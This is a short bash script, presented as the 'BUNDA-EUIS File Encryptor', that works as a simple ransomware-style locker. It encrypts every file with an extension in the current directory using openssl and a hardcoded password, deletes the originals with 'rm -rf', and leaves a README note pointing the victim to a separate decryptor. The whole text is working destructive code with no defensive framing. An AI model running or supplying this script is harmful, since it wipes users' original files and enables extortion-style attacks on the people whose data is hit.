#!/bin/bash
# BUNDA-EUIS File Encryptor v.1
# Created by Prima Setiawan / joeheartless
#
file=$(ls -f *.*)
i=1
for enc in $file 
do 
	echo "[$i] File $enc encrypted"
	openssl enc -aes-256-cbc -in $enc -out bunda.$enc -pbkdf2 -k bundaeuisgeulis # <-- $passwed
	file[i]=$enc
	i=$(( i + 1 ))
done
rm -rf $file
echo "File encrypted, use Bunda-Euis-Decryptor to decrypt." > README.txt
sleep 1
echo "--------------------------------------------------------------------------------------------------------------------------------------"
ls
